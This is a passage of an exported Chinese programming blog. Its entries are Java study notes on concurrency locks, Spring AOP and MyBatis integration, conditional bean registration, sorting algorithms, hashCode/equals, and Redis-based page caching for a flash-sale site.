(BrokenBarrierException e) &#123; e.printStackTrace(); &#125; log.info("continue..."); &#125;&#125; 运行效果：先每隔一秒执行race方法打印出ready,等3个线程打印完毕，立即都将阻塞的log.info(“continue…”);全部打印出来。 123456789101112[pool-1-thread-1] INFO ready...[pool-1-thread-2] INFO ready...[pool-1-thread-3] INFO ready...[pool-1-thread-1] INFO continue...[pool-1-thread-2] INFO continue...[pool-1-thread-3] INFO continue...[pool-1-thread-4] INFO ready...[pool-1-thread-2] INFO ready...[pool-1-thread-3] INFO ready...[pool-1-thread-4] INFO continue...[pool-1-thread-2] INFO continue...[pool-1-thread-3] INFO continue... 也可以设定超时时间，超过时间了就不等了。 12345678910private static void race() throws InterruptedException &#123; Thread.sleep(1000); log.info("ready..."); try &#123; cyclicBarrier.await(2000, TimeUnit.MILLISECONDS); &#125; catch (Exception e) &#123; log.warn("exception",e); &#125; log.info("continue...");&#125; 如果在大家已经都准备好了的时候，先做一件事情，可以在声明CyclicBarrier后面增加一个线程来执行。 就像开会，人都到齐了之后，我们喊一声，人都到齐，我们现在开始开会了啊。下面就开始正式开会。123private static CyclicBarrier cyclicBarrier = new CyclicBarrier(5,() -&gt; &#123; log.info("callback is running...");&#125;); 3. ReentrantLock与锁3.1 ReentrantLock与synchronized区别 都是可重入锁 synchronized是JVM实现的，ReentrantLock是jdk实现的。前者是操作系统来实现，后者是敲代码实现。 synchronized以前性能很烂，在优化之后，两者差不多。 synchronized比较方便，ReentrantLock需要手工加锁和释放锁。但是ReentrantLock更加灵活。 3.2 ReentrantLock优点 可以指定公平锁和非公平锁，但是synchronized只能是非公平锁 提供了一个Condition类，可以分组唤醒需要唤醒的线程；而synchronized要么是随机唤醒一个线程，要么是唤醒所有线程 提供能够中断等待锁的线程的机制，lock.lockInterruptibly() ReentrantLock依靠自旋锁实现，通过循环调用CAS操作来实现加锁，性能比较好是因为避免了线程进入内核态的阻塞状态 其中，ReentrantReadWriteLock是一个在没有读写锁的情况下，才可以有写入锁。读多写少，可能会导致写进程饥饿。]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.AOP、异常、整合mybatis]]></title>
    <url>%2F2018%2F07%2F21%2F6.AOP%E3%80%81%E5%BC%82%E5%B8%B8%E3%80%81%E6%95%B4%E5%90%88mybatis%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 1、AOP用来验证用户是否已经登陆 定义一个切面类，访问指定的方法就会触发切面。 1234567891011121314151617181920@Aspect@Component@Slf4jpublic class SellerAuthorizeAspect &#123; @Pointcut("execution(public * com.snail.controller.Seller*.*(..))" + "&amp;&amp; !execution(public * com.snail.controller.SellerInfoController.*(..))") public void verify()&#123;&#125; @Before("verify()") public void doVerify()&#123; ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes(); HttpServletRequest request = attributes.getRequest(); if(request.getSession().getAttribute("loginUser") == null)&#123; log.warn("【登陆校验】,用户未登陆"); throw new SellerAuthorizeException(); &#125; &#125;&#125; 这里是指定Seller开头的所有controller下面的所有方法都进来，但是排除掉登陆的那个controller. 在登陆的时候，我这里简单地处理：将登陆者的信息存到了session之中。如果这里拿不到session里面的值，就抛出一个自定义的异常： 12public class SellerAuthorizeException extends RuntimeException&#123;&#125; 下面就是捕获这个异常： 123456789101112@ControllerAdvicepublic class SellExceptionHandler &#123; @Autowired private ProjectUrlConfig projectUrlConfig; @ExceptionHandler(value = SellerAuthorizeException.class) public ModelAndView handlerAuthorizeException() &#123; return new ModelAndView("redirect:" .concat(projectUrlConfig.getSell()) .concat("/sell/login")); &#125;&#125; 这里全局捕获刚才抛出的异常，将其重定向到登陆页面。 2、我们发现，当用提交信息正常的时候，返回的是Result对象，但是一旦发生异常，格式不正确，这里用统一异常（上面已经用了）的方式进行捕获，返回我们想要的统一的格式。 在上面的SellExceptionHandler中，添加一个统一异常： 123456/**针对SellException做一个统一异常处理，返回固定的格式ResultVO*/@ExceptionHandler(value = SellException.class)@ResponseBodypublic ResultVO handlerSellerException(SellException e)&#123; return ResultVOUtil.error(e.getCode(),e.getMessage());&#125; 这个就很简单了，如果抛出SellException，这里就捕获，然后返回这里的形式。 3、上面虽然返回了我们想要的形式，但是状态码都是200，如果需要返回指定的状态码该怎么办呢？ 继续在上面的在上面的SellExceptionHandler中添加一个统一异常： 123456/**上面的统一异常虽然可以返回我们需要的信息，但是状态吗仍然是200，这里可以返回想要的状态吗*/@ExceptionHandler(value = ResponseBankException.class)@ResponseStatus(HttpStatus.FORBIDDEN)public void handlResponseBankException()&#123;&#125; 它直接捕获ResponseBankException这个异常，这里返回状态码自己定义，然后在需要的地方直接抛出这个异常即可。 4、整合基于注解的mybatis： 首先是引入依赖： 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt;&lt;/dependency&gt; 启动函数上开启扫描： 1@MapperScan(basePackages = &quot;com.snail.entity.mapper&quot;) 我们写的接口就放在这个路径下面。 下面进行对类目的增删改查的操作： 1234567891011121314151617181920212223242526272829303132333435public interface ProductCategoryMapper &#123; /**插入指定的字段*/ @Insert("insert into product_category(category_name,category_type) values(#&#123;category_name,jdbcType=VARCHAR&#125;,#&#123;category_type,jdbcType=INTEGER&#125;)") int insertByMap(Map&lt;String,Object&gt; map); /**插入对象*/ @Insert("insert into product_category(category_name,category_type) values(#&#123;categoryName,jdbcType=VARCHAR&#125;,#&#123;categoryType,jdbcType=INTEGER&#125;)") int insertByObject(ProductCategory productCategory); /**根据指定的字段进行查询*/ @Select("select * from product_category where category_type = #&#123;categoryType&#125;") @Results(&#123; @Result(column = "category_type",property = "categoryType") &#125;) ProductCategory findByCategoryType(Integer categoryType); /**根据指定的字段进行查询*/ @Select("select * from product_category where category_name = #&#123;categoryName&#125;") @Results(&#123; @Result(column = "category_name",property = "categoryName") &#125;) List&lt;ProductCategory&gt; findByCategoryName(String name); /**根据指定的字段进行更新*/ @Update("update product_category set category_name= #&#123;categoryName&#125; where category_type=#&#123;categoryType&#125;") int updateByCategoryType(@Param("categoryName") String categoryName,@Param("categoryType") Integer categoryType); /**根据对象进行更新*/ @Update("update product_category set category_name= #&#123;categoryName&#125; where category_type=#&#123;categoryType&#125;") int updateByObject(ProductCategory productCategory); /**根据指定的字段进行删除*/ @Delete("delete from product_category where category_type = #&#123;categoryType&#125;") int deleteByType(Integer categoryType);&#125; 5、xml方式整合mybatis 引入依赖和主函数中的启动扫描类。 写一个查询接口： 1ProductCategory selectByCategoryType(Integer categoryType); 在resources下新建与这个接口所在包的同目录（不同会报错），然后新建xml： 123456789101112131415&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd" &gt;&lt;mapper namespace="com.snail.entity.mapper.ProductCategoryMapper"&gt; &lt;resultMap id="BaseResult" type="com.snail.entity.ProductCategory"&gt; &lt;id column="category_id" property="categoryId" jdbcType="INTEGER"/&gt; &lt;id column="category_name" property="categoryName" jdbcType="VARCHAR"/&gt; &lt;id column="category_type" property="categoryType" jdbcType="INTEGER"/&gt; &lt;/resultMap&gt; &lt;select id="selectByCategoryType" resultMap="BaseResult" parameterType="java.lang.Integer"&gt; SELECT category_id,category_name,category_type FROM product_category WHERE category_type = #&#123;categoryType,jdbcType=INTEGER&#125; &lt;/select&gt;&lt;/mapper&gt; 最后不要忘记在yml中配置xml文件的位置： 12mybatis: mapper-locations: classpath:mapper:/*.xml]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.@Conditional-按照条件注册bean]]></title>
    <url>%2F2018%2F07%2F21%2F6.%40Conditional-%E6%8C%89%E7%85%A7%E6%9D%A1%E4%BB%B6%E6%B3%A8%E5%86%8Cbean%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 按照一定的条件进行判断，满足条件给容器注册bean。 先创建三个bean： 1234567891011121314151617@Configurationpublic class MainConfig2 &#123; @Bean public Person person()&#123; return new Person("李四",20); &#125; @Bean("bill") public Person person01()&#123; return new Person("Bill",60); &#125; @Bean("linus") public Person person02()&#123; return new Person("linus",50); &#125;&#125; 打印一下创建的bean： 123456789101112@Testpublic void test03()&#123; ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); String[] names = applicationContext.getBeanNamesForType(Person.class); for(String name:names)&#123; System.out.println("---&gt;"+name); &#125; Map&lt;String,Person&gt; types = applicationContext.getBeansOfType(Person.class); System.out.println(types);&#125; 打印结果： 1234---&gt;person---&gt;bill---&gt;linus&#123;person=Person(name=李四, age=20), bill=Person(name=Bill, age=60), linus=Person(name=linus, age=50)&#125; 那假设一个场景：如果系统是windows,给容器注册“bill”；如果系统是linux,给容器注册“linus”； 至于获取操作系统是什么，我们可以： 123ConfigurableEnvironment environment = (ConfigurableEnvironment) applicationContext.getEnvironment();String osName = environment.getProperty("os.name");System.out.println(osName);//wondows 7 那么我们如何根据条件来注册bean呢？ 123456789101112131415161718192021//判断是否是linux系统public class LinuxCondition implements Condition &#123; @Override public boolean matches(ConditionContext conditionContext, AnnotatedTypeMetadata annotatedTypeMetadata) &#123; //1.获取IOC使用的bean factory，这个factory就是创建对象并进行装配的工厂 ConfigurableListableBeanFactory factory = conditionContext.getBeanFactory(); //2.获取类加载器 ClassLoader classLoader = conditionContext.getClassLoader(); //3.获取当前环境信息 Environment environment = conditionContext.getEnvironment(); //4.获取到bean定义的注册类 BeanDefinitionRegistry registry = conditionContext.getRegistry();//如果是liunx系统，就让其注册进容器，windows也是如此 String osName = environment.getProperty("os.name"); if(osName.contains("Linux"))&#123; return true; &#125; return false; &#125;&#125; 12345678910111213141516171819@Configurationpublic class MainConfig2 &#123; @Bean public Person person()&#123; return new Person("李四",20); &#125; @Conditional(&#123;WindowsCondition.class&#125;)//传condition数组 @Bean("bill") public Person person01()&#123; return new Person("Bill",60); &#125; @Conditional(LinuxCondition.class) @Bean("linus") public Person person02()&#123; return new Person("linus",50); &#125;&#125; 那么运行结果可以预测到：由于我们是windows系统，所以linux的就不能注册进容器了。 1234Windows 7---&gt;person---&gt;bill&#123;person=Person(name=李四, age=20), bill=Person(name=Bill, age=60)&#125;]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5、项目初始化]]></title>
    <url>%2F2018%2F07%2F21%2F5%E3%80%81%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96%2F</url>
    <content type="text"><![CDATA[搭建SSM项目。 项目初始化————–&gt;项目初始化]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5、几种排序算法的对比]]></title>
    <url>%2F2018%2F07%2F21%2F5%E3%80%81%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%B9%E6%AF%94%2F</url>
    <content type="text"><![CDATA[几种排序算法的对比 排序 平均时间复杂度 原地排序 额外空间 稳定排序 插入排序 O(n^2) √ O(1) √ 归并排序 O(nlogn) × O(n) √ 快速排序 O(nlogn) √ O(logn) × 堆排序 O(nlogn) √ O(1) × 稳定排序的定义对于相等的元素，在排序后，原来靠前的元素依然靠前。相等元素的相对位置没有发生改变。 插入为什么稳定 归并为什么稳定 快速排序为什么不稳定因为每次都要选择基准点，可能会使本来在后面的元素排到了前面 堆排序为什么不稳定将数组构造为堆时也可能会使后面的元素跑到前面去。]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5、hashcode和equals]]></title>
    <url>%2F2018%2F07%2F21%2F5%E3%80%81hashcode%E5%92%8Cequals%2F</url>
    <content type="text"><![CDATA[hashcode涉及到集合HashMap等集合，此篇侧重于了解hashcode和equals方法的作用的原理。 1. Hash是什么 Hash是散列的意思，就是把任意长度的输入，通过散列算法变换成固定长度的输出，该输出就是散列值。 2. 散列值 1、如果散列表中存在和散列原始输入K相等的记录，那么K必定在f(K)的存储位置上 2、不同关键字经过散列算法变换后可能得到同一个散列地址，这种现象称为碰撞 3、如果两个Hash值不同（前提是同一Hash算法），那么这两个Hash值对应的原始输入必定不同 3. 什么是hashcode 1、HashCode的存在主要是为了查找的快捷性，HashCode是用来在散列存储结构中确定对象的存储地址的 2、如果两个对象equals相等，那么这两个对象的HashCode一定也相同 3、如果对象的equals方法被重写，那么对象的HashCode方法也尽量重写 4、如果两个对象的HashCode相同，不代表两个对象就相同，只能说明这两个对象在散列存储结构中，存放于同一个位置 4. HashCode有什么用 比方说Set里面已经有1000个元素了，那么第1001个元素进来的时候，最多可能调用1000次equals方法，如果equals方法写得复杂，对比的东西特别多，那么效率会大大降低。 使用HashCode就不一样了，比方说HashSet，底层是基于HashMap实现的，先通过HashCode取一个模，这样一下子就固定到某个位置了，如果这个位置上没有元素，那么就可以肯定HashSet中必定没有和新添加的元素equals的元素，就可以直接存放了，都不需要比较； 如果这个位置上有元素了，逐一比较，比较的时候先比较HashCode，HashCode都不同接下去都不用比了，肯定不一样，HashCode相等，再equals比较，没有相同的元素就存，有相同的元素就不存。 如果原来的Set里面有相同的元素，只要HashCode的生成方式定义得好（不重复），不管Set里面原来有多少元素，只需要执行一次的equals就可以了。这样一来，实际调用equals方法的次数大大降低，提高了效率。 【特别注意】这里需要注意的是：当俩个对象的hashCode值相同的时候，Hashset会将对象保存在同一个位置，但是他们equals返回false，所以实际上这个位置采用链式结构来保存多个对象。 5. 为什么重写Object的equals(Object obj)方法尽量要重写Object的hashCode()方法上面方法确实提高了效率。但一个面临问题：若两个对象equals相等，但不在一个区间，因为hashCode的值在重写之前是对内存地址计算得出，所以根本没有机会进行比较，会被认为是不同的对象(这就是为什么还要重写hashcode方法了)。所以Java对于eqauls方法和hashCode方法是这样规定的： 1 如果两个对象相同(equals为true)，那么它们的hashCode值一定要相同。也告诉我们重写equals方法，一定要重写hashCode方法，也就是说hashCode值要和类中的成员变量挂上钩，对象相同–&gt;成员变量相同—-&gt;hashCode值一定相同。 2 如果两个对象的hashCode相同(只是映射到同一个位置而已)，它们并不一定相同，这里的对象相同指的是用eqauls方法比较。 简单来说，如果只重写equals方法而不重写hashcode方法，会导致重复元素的产生。具体通过下面的例子进行说明。 6. 举例6.1 Student类很简单，定义了id和name两个字段，无参和有参构造函数，toString方法。 1234567891011121314151617181920public class Student &#123; private int id; private String name; get(),set()略... public Student()&#123;&#125; public Student(int id, String name) &#123; super(); this.id = id; this.name = name; &#125; @Override public String toString() &#123; return "Student [id=" + id + ", name=" + name + "]"; &#125;&#125; 6.2 main方法1234567891011121314151617181920public static void main(String[] args) &#123; Student student1 = new Student(1,"hh"); Student student2 = new Student(1,"hh"); Student student3 = new Student(2,"gg"); HashSet&lt;Student&gt; set = new HashSet&lt;Student&gt;(); set.add(student1); set.add(student2); set.add(student3); set.add(student1);//重复添加了student1 System.out.println("set集合容量为: "+set.size()); Iterator&lt;Student&gt; iterator = set.iterator(); while (iterator.hasNext()) &#123; Student student = iterator.next(); System.out.println(student+"---"+student.hashCode()); &#125; &#125; 6.2 只重写equals()方法，而不重写HashCode()方法输出： 1234set集合容量为: 3Student [id=2, name=gg]---2018699554Student [id=1, name=hh]---366712642Student [id=1, name=hh]---1829164700 结论： 覆盖equals（Object obj）但不覆盖hashCode（）,导致数据不唯一性 分析： （1）当执行set.add(student1)时，集合为空，直接存入集合； （2）当执行set.add(student2)时，首先判断该对象（student2）的hashCode值所在的存储区域是否有相同的hashCode，因为没有覆盖hashCode方法，所以jdk使用默认Object的hashCode方法，返回内存地址转换后的整数，因为不同对象的地址值不同，所以这里不存在与student2相同hashCode值的对象，因此jdk默认不同hashCode值，equals一定返回false，所以直接存入集合。 （3）当执行set.add(student3)时,与2同理。 （4）当最后执行set.add(student1)时，因为student1已经存入集合，同一对象返回的hashCode值是一样的，继续判断equals是否返回true，因为是同一对象所以返回true。此时jdk认为该对象已经存在于集合中，所以舍弃。 6.3 只重写HashCode()方法，equals()方法直接返回false1234set集合容量为: 3Student [id=1, name=hh]---4320Student [id=1, name=hh]---4320Student [id=2, name=gg]---4319 分析： 首先student1和student2的对象比较hashCode，因为重写了HashCode方法，所以hashcode相等,然后比较他们两的equals方法，因为equals方法始终返回false,所以student1和student2也是不相等的，所以student2也被放进了set 首先student1(student2)和student3的对象比较hashCode，不相等，所以student3放进set中 最后再看student4,比较student1和student4发现hashCode是相等的，在比较equals方法，因为equals返回false,所以student1和student4不相等;同样，student2和student4也是不相等的;student3和student4的hashcode都不相等，所以肯定不相等的，所以student4可以放到set集合中，那么结果应该是size:4,那为什么会是3呢？ 这时候我们就需要查看HashSet的源码了，下面是HashSet中的add方法的源码： 123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; 这里我们可以看到其实HashSet是基于HashMap实现的，我们在点击HashMap的put方法，源码如下： 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else &#123; Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null;&#125; 首先是判断hashCode是否相等，不相等的话，直接跳过，相等的话，然后再来比较这两个对象是否相等或者这两个对象的equals方法，因为是进行的或操作，所以只要有一个成立即可，那这里我们就可以解释了，其实上面的那个集合的大小是3,因为最后的一个r1没有放进去，以为r1==r1返回true的，所以没有放进去了。所以集合的大小是3，如果我们将hashCode方法设置成始终返回false的话，这个集合就是4了。 这篇文章比较简洁地说明了这个问题：http://blog.csdn.net/xyh269/article/details/69171545 6.4 内存泄露重写equals和hashcode方法，执行main，执行结果是： 123set集合容量为: 2Student [id=1, name=hh]---4320Student [id=2, name=gg]---4319 将main方法改为： 1234567891011121314151617181920212223242526272829public static void main(String[] args) &#123; Student student1 = new Student(1,"hh"); Student student2 = new Student(1,"hh"); Student student3 = new Student(2,"gg"); HashSet&lt;Student&gt; set = new HashSet&lt;Student&gt;(); set.add(student1); set.add(student2); set.add(student3); set.add(student1);//重复添加了student1 System.out.println("set集合容量为: "+set.size()); //------新增的开始------- student3.setId(11); set.remove(student3); System.out.println("set集合容量为: "+set.size()); //------新增的结束------- Iterator&lt;Student&gt; iterator = set.iterator(); while (iterator.hasNext()) &#123; Student student = iterator.next(); System.out.println(student+"---"+student.hashCode()); &#125; &#125; 运行结果是： 1234set集合容量为: 2set集合容量为: 2Student [id=1, name=hh]---4320Student [id=11, name=gg]---4598 我们调用了remove删除student3对象，以为删除了student3,但事实上并没有删除，这就叫做内存泄露，就是不用的对象但是他还在内存中。所以我们多次这样操作之后，内存就爆了。 原因： 在调用remove方法的时候，会先使用对象的hashCode值去找到这个对象，然后进行删除，这种问题就是因为我们在修改了对象student3的id属性的值，又因为RectObject对象的hashCode方法中有id值参与运算,所以student3对象的hashCode就发生改变了，所以remove方法中并没有找到student3了，所以删除失败。即student3的hashCode变了，但是他存储的位置没有更新，仍然在原来的位置上，所以当我们用他的新的hashCode去找肯定是找不到了。 总结： 上面的这个内存泄露告诉我一个信息：如果我们将对象的属性值参与了hashCode的运算中，在进行删除的时候，就不能对其属性值进行修改，否则会出现严重的问题。 7. 总结 1.hashCode是为了提高在散列结构存储中查找的效率，在线性表中没有作用。 2.equals和hashCode需要同时覆盖。 3.若两个对象equals返回true，则hashCode有必要也返回相同的int数。 4.若两个对象equals返回false，则hashCode不一定返回不同的int数,但为不相等的对象生成不同hashCode值可以提高哈希表的性能。 5.若两个对象hashCode返回相同int数，则equals不一定返回true。 6.若两个对象hashCode返回不同int数，则equals一定返回false。 7.同一对象在执行期间若已经存储在集合中，则不能修改影响hashCode值的相关信息，否则会导致内存泄露问题。 参考了一些： http://blog.csdn.net/haobaworenle/article/details/53819838 http://www.cnblogs.com/xrq730/p/4842028.html http://blog.csdn.net/qq_21688757/article/details/53067814 http://blog.csdn.net/fyxxq/article/details/42066843]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5.页面级高并发秒杀优化（Redis缓存+静态化分离）]]></title>
    <url>%2F2018%2F07%2F21%2F5.%E9%A1%B5%E9%9D%A2%E7%BA%A7%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E4%BC%98%E5%8C%96%EF%BC%88Redis%E7%BC%93%E5%AD%98%2B%E9%9D%99%E6%80%81%E5%8C%96%E5%88%86%E7%A6%BB%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在页面级别进行性能提升，比如用缓存和页面静态化技术。 1. 页面缓存这里以商品列表页面为例。 原来的商品列表页面是这样写的： 123456789@RequestMapping("to_list")public String toList(Model model,MiaoshaUser user)&#123; if(user == null) return "login"; model.addAttribute("user",user); List&lt;GoodsVo&gt; goodsVoList = goodsService.getGoodsVoList(); model.addAttribute("goodsList",goodsVoList); return "goods_list";&#125; 给他添加页面缓存： 12345678910111213141516171819202122232425@RequestMapping(value = "to_list",produces = "text/html")@ResponseBodypublic String toList(Model model, MiaoshaUser user, HttpServletRequest request, HttpServletResponse response) throws IOException &#123; if(user == null)&#123; response.sendRedirect("/login/to_login"); return null; &#125; model.addAttribute("user",user); //先尝试从缓存中取 String html = redisService.get(GoodsKey.getGoodsList,"",String.class); if(!StringUtils.isEmpty(html))&#123; return html; &#125; //取不到，则手动渲染，再保存到redis List&lt;GoodsVo&gt; goodsVoList = goodsService.getGoodsVoList(); model.addAttribute("goodsList",goodsVoList); SpringWebContext ctx = new SpringWebContext(request,response,request.getServletContext(), request.getLocale(), model.asMap(),applicationContext); html = thymeleafViewResolver.getTemplateEngine().process("goods_list",ctx); if(!StringUtils.isEmpty(html))&#123; redisService.set(GoodsKey.getGoodsList,"",html); &#125; return html;&#125; 对于商品详情页面的缓存，原来是这样写的： 12345678910111213141516171819202122232425262728@RequestMapping("/to_detail/&#123;goodsId&#125;")public String toDetail(@PathVariable("goodsId") long goodsId,Model model, MiaoshaUser user)&#123; if(user == null) return "login"; model.addAttribute("user",user); GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); model.addAttribute("goods",goodsVo); long startAt = goodsVo.getStartDate().getTime(); long endAt = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); int miaoshaStatus = 0;//秒杀活动的状态，0-秒杀前；1-正在秒杀；2-秒杀结束 int remainSeconds = 0;//秒杀活动还剩多少秒 if(now &lt; startAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.BEFORE_START; remainSeconds = (int)(startAt-now)/1000; &#125;else if (now &gt; endAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.AFTER_MIAOSHA; remainSeconds = -1; &#125;else &#123; miaoshaStatus = Constants.MiaoshaStatus.ON_MIAOSHA; remainSeconds = 0; &#125; model.addAttribute("miaoshaStatus",miaoshaStatus); model.addAttribute("remainSeconds",remainSeconds); return "goods_detail"; &#125; 现在改为如下，以goodsid作为区别：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647@RequestMapping(value = "/to_detail/&#123;goodsId&#125;",produces = "text/html")@ResponseBodypublic String toDetail(@PathVariable("goodsId") long goodsId,Model model, MiaoshaUser user, HttpServletRequest request, HttpServletResponse response) throws IOException&#123; if(user == null)&#123; response.sendRedirect("/login/to_login"); return null; &#125; model.addAttribute("user",user); //先尝试从缓存中取 String html = redisService.get(GoodsKey.getGoodsDetail,""+goodsId,String.class); if(!StringUtils.isEmpty(html))&#123; return html; &#125; GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); model.addAttribute("goods",goodsVo); long startAt = goodsVo.getStartDate().getTime(); long endAt = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); int miaoshaStatus = 0;//秒杀活动的状态，0-秒杀前；1-正在秒杀；2-秒杀结束 int remainSeconds = 0;//秒杀活动还剩多少秒 if(now &lt; startAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.BEFORE_START; remainSeconds = (int)(startAt-now)/1000; &#125;else if (now &gt; endAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.AFTER_MIAOSHA; remainSeconds = -1; &#125;else &#123; miaoshaStatus = Constants.MiaoshaStatus.ON_MIAOSHA; remainSeconds = 0; &#125; model.addAttribute("miaoshaStatus",miaoshaStatus); model.addAttribute("remainSeconds",remainSeconds); SpringWebContext ctx = new SpringWebContext(request,response,request.getServletContext(), request.getLocale(), model.asMap(),applicationContext); html = thymeleafViewResolver.getTemplateEngine().process("goods_detail",ctx); if(!StringUtils.isEmpty(html))&#123; redisService.set(GoodsKey.getGoodsDetail,""+goodsId,html); &#125; return html;&#125;&#125; 2. 对象缓存就是对一个对象进行缓存，比如这里可以对MiaoshaUser这个对象进行缓存： 12345678910111213public MiaoshaUser getById(long id)&#123; //先去缓存取 MiaoshaUser user = redisService.get(MiaoshaUserKey.getById,""+id,MiaoshaUser.class); if(user != null)&#123; return user; &#125; //缓存没有则去数据库取 user = miaoshaUserDao.getById(id); if(user != null)&#123; redisService.set(MiaoshaUserKey.getById,""+user.getId(),user); &#125; return user;&#125; 这个逻辑是十分清晰的，但是如果我是更新一个信息呢？比如更新登录的用户的Nickname。那么就要注意，先更新数据库，在更新好数据库之后，一定要注意处理相关的缓存。 123456789101112131415public boolean updateUsername(String token,long id,String newUsername)&#123; MiaoshaUser user = getById(id); if(user == null) throw new GlobalException(CodeMsg.MOBILE_NOT_EXIST); //更新数据库 MiaoshaUser toBeUpdate = new MiaoshaUser(); toBeUpdate.setId(id); toBeUpdate.setNickname(newUsername); miaoshaUserDao.update(toBeUpdate); //处理缓存 redisService.del(MiaoshaUserKey.getById,""+id); user.setNickname(newUsername); redisService.set(MiaoshaUserKey.token,token,user);//token不能直接删除，否则会要求重新登录 return true;&#125; 3. 商品详情页面静态化之前我们队商品详情页面进行了redis缓存，因为这个接口只是展示相应产品详情和秒杀倒计时等信息，只要显示几个关键信息即可，其他的都可以进行静态化。 这种技术，我们其实已经做过了，在之前的电商项目中，前端用vue.js等其他js框架或者不用框架，直接jquery。前端分为两部分，一部分是不改变的html块，还有一块就是数据，他只要后端传数据到前端即可，用到ajax技术。 确定哪些是需要传到前端的数据： 1234567@Datapublic class DetailVo &#123; private int miaoshaStatus = 0; private int remainSeconds = 0; private GoodsVo goods; private MiaoshaUser user;&#125; 将detail这个接口改为： 12345678910111213141516171819202122232425262728293031323334@RequestMapping(value = "/detail/&#123;goodsId&#125;")@ResponseBodypublic Result&lt;DetailVo&gt; toDetail(@PathVariable("goodsId") long goodsId, MiaoshaUser user, HttpServletRequest request, HttpServletResponse response) throws IOException&#123; if(user == null)&#123; response.sendRedirect("/login/to_login"); return null; &#125; GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); long startAt = goodsVo.getStartDate().getTime(); long endAt = goodsVo.getEndDate().getTime(); long now = System.currentTimeMillis(); int miaoshaStatus = 0;//秒杀活动的状态，0-秒杀前；1-正在秒杀；2-秒杀结束 int remainSeconds = 0;//秒杀活动还剩多少秒 if(now &lt; startAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.BEFORE_START; remainSeconds = (int)(startAt-now)/1000; &#125;else if (now &gt; endAt)&#123; miaoshaStatus = Constants.MiaoshaStatus.AFTER_MIAOSHA; remainSeconds = -1; &#125;else &#123; miaoshaStatus = Constants.MiaoshaStatus.ON_MIAOSHA; remainSeconds = 0; &#125; DetailVo detailVo = new DetailVo(); detailVo.setUser(user); detailVo.setGoods(goodsVo); detailVo.setMiaoshaStatus(miaoshaStatus); detailVo.setRemainSeconds(remainSeconds); return Result.success(detailVo);&#125; 后端的数据已经有了，那么前端只要接收这些数据即可。 首先是在static目录下新建goods_detail.htm页面，里面讲themeleaf的动态获取的对象全部去除。改为最普通的html，只要用id来标识一下，然后在js中赋值即可。比如： 123456789101112&lt;tr&gt; &lt;td&gt;商品原价&lt;/td&gt; &lt;td colspan="3" id="goodsPrice"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;秒杀价&lt;/td&gt; &lt;td colspan="3" id="miaoshaPrice"&gt;&lt;/td&gt; &lt;/tr&gt;&lt;tr&gt; &lt;td&gt;库存数量&lt;/td&gt; &lt;td colspan="3" id="stockCount"&gt;&lt;/td&gt; &lt;/tr&gt; js部分，首先是打开页面就执行这个方法： 1234$(function()&#123; //countDown(); getDetail();&#125;); 里面的getDetail方法为： 1234567891011121314151617function getDetail()&#123; var goodsId = g_getQueryString("goodsId"); $.ajax(&#123; 